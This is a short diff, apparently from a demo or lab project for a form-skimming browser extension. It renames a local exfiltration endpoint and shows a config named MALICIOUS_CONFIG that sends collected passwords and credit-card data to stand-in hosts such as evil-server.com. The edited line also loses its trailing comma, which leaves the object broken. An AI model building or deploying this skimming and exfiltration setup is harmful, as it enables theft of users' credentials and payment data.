@@ -374,7 +374,7 @@ function setupFormMonitoring() {
 const MALICIOUS_CONFIG = {
   collectUrl: 'https://evil-server.com/collect',
   fallbackUrl: 'http://backup-evil.com/data',
-  devUrl: 'http://localhost:3002/skimmed-data',
+  devUrl: 'http://localhost:3002/stolen-data'
 
   collectPasswords: true,
   collectCreditCards: true,
@@ -514,7 +514,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 
 **Extension Data Exfiltration**:
 ```
-POST http://localhost:3002/skimmed-data
+POST http://localhost:3002/stolen-data
 Content-Type: application/json
 
 {
